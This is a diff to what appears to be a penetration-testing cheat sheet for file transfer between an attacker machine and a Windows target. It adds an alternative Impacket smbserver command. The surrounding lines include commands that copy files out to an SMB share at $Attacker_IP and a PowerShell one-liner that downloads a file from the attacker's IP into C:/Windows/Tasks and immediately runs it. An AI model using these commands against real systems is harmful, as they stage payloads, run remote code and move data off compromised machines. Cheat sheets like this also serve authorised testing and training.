@@ -54,6 +54,8 @@ wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"
 
 # 9. smbserver
 impacket-smbserver share ./ -smb2support -user 0xmr -pass ''
+or 
+smbserver.py share ./ -smb2support -user 0xmr -pass ''
 
 ##  Copy to windows
 net use \\$Attacker_IP\share /user:0xmr
@@ -65,5 +67,6 @@ copy file_name \\$Attacker_IP\share
 
 # 10. Download and Execution Both
 powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windows/Tasks/file; C:/Windows/Tasks/file"
+
 powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
 ```
